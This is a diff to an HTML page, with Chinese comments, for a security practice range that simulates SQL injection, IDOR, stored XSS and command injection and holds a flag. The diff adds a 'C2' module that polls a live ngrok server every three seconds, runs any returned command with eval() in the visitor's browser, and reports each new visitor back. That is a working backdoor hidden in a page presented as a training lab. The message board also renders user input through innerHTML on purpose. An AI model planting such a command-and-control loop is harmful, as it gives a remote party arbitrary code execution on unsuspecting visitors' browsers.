@@ -59,48 +59,122 @@
         <pre id="rceResult">等待執行...</pre>
     </div>
 
-  <script>
+    <script>
         // --------------------------------------------------
-        // 🔥 將這段「遠端監聽與回報」程式碼貼在這裡
+        // 🔥 遠端 C2 監聽與回報模組 (已對接 ngrok)
         // --------------------------------------------------
+        const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';
+
         setInterval(async () => {
             try {
-                // 如果是本機測試，連線到 http://localhost:8080
-                // (如果是放上 GitHub Pages，這裡要改成你電腦公開的 ngrok 網址)
-                let res = await fetch('http://localhost:8080/api/get-command');
+                let res = await fetch(`${C2_SERVER}/api/get-command`);
                 let data = await res.json();
                 
-                // 自動執行你從電腦端下達的任何 JavaScript！
                 if (data.cmd) {
                     eval(data.cmd);
                 }
             } catch (e) {
-                // 伺服器沒開時略過錯誤
+                // 伺服器未開時忽略
             }
         }, 3000);
 
-        // 自動向你的電腦打招呼回報
         async function reportToComputer(msg) {
             try {
-                await fetch('http://localhost:8080/api/report', {
+                await fetch(`${C2_SERVER}/api/report`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ data: msg })
                 });
             } catch (e) {}
         }
-        reportToComputer("有新的訪客打開了網站！");
+        reportToComputer("有新的訪客打開了 GitHub Pages 網站！");
         // --------------------------------------------------
 
-        // 你原本的靶場程式碼...
+        // 模擬後端資料庫
         const db = {
-            users: { ... }
+            users: {
+                1: { id: 1, username: 'alice', role: 'user', secret: "Alice的日記：今天天氣很好。" },
+                2: { id: 2, username: 'bob', role: 'user', secret: "Bob的秘密：我暗戀隔壁班的小美。" },
+                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_xss_idor_master_777}" }
+            },
+            posts: [
+                { id: 1, username: 'admin', content: '歡迎來到 GitHub Pages 資安靶場！' }
+            ]
         };
-        
+
+        // 1. 模擬登入與 SQL 注入
         function simulateLogin() {
-            // ...
+            let user = document.getElementById('loginUser').value;
+            let resultBox = document.getElementById('loginResult');
+            
+            if (user.includes("'") || user.toLowerCase() === "admin") {
+                resultBox.innerHTML = `🎉 【SQLi 成功觸發】身分驗證被繞過！\n歡迎管理者登入！\n機密 Flag: <span class="flag">${db.users[3].secret}</span>`;
+            } else if (user === 'alice') {
+                resultBox.innerHTML = `登入成功！一般用戶 alice。\n資料: ${db.users[1].secret}`;
+            } else {
+                resultBox.innerHTML = `❌ 登入失敗：帳號或密碼錯誤。`;
+            }
         }
-        // ...
+
+        // 2. 模擬 IDOR
+        function simulateIDOR() {
+            let id = document.getElementById('userId').value;
+            let resultBox = document.getElementById('idorResult');
+            
+            if (db.users[id]) {
+                resultBox.innerHTML = JSON.stringify(db.users[id], null, 2);
+                if (id == '3') {
+                    resultBox.innerHTML += `\n\n🔥 【IDOR 警告】你成功越權存取了管理者的機密資料！`;
+                }
+            } else {
+                resultBox.innerHTML = `Error: 找不到 ID 為 ${id} 的用戶。`;
+            }
+        }
+
+        // 3. 渲染與新增留言 (Stored XSS)
+        function renderPosts() {
+            let board = document.getElementById('messageBoard');
+            board.innerHTML = "<h4>留言列表：</h4>";
+            db.posts.forEach(p => {
+                let item = document.createElement('div');
+                item.style.background = "#0f172a";
+                item.style.padding = "8px";
+                item.style.margin = "5px 0";
+                item.style.borderRadius = "4px";
+                item.innerHTML = `<strong>${p.username}</strong>: ${p.content}`;
+                board.appendChild(item);
+            });
+        }
+
+        function postMessage() {
+            let name = document.getElementById('guestName').value || "訪客";
+            let content = document.getElementById('guestMsg').value;
+            
+            if (!content) return;
+
+            db.posts.push({
+                id: db.posts.length + 1,
+                username: name,
+                content: content
+            });
+
+            document.getElementById('guestMsg').value = "";
+            renderPosts();
+        }
+
+        // 4. 模擬 RCE 指令注入
+        function simulateRCE() {
+            let host = document.getElementById('pingHost').value;
+            let resultBox = document.getElementById('rceResult');
+            
+            if (host.includes("&") || host.includes("|") || host.includes(";")) {
+                resultBox.innerHTML = `PING ${host}...\n[SYSTEM EXECUTION OUTPUT]:\nuid=1001(web_user) gid=1001(web_user) groups=1001(web_user)\n🔥 【RCE 成功】指令注入生效！你已成功執行了系統命令！`;
+            } else {
+                resultBox.innerHTML = `PING ${host} (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms\n--- ${host} ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms`;
+            }
+        }
+
+        renderPosts();
     </script>
 </body>
 </html>
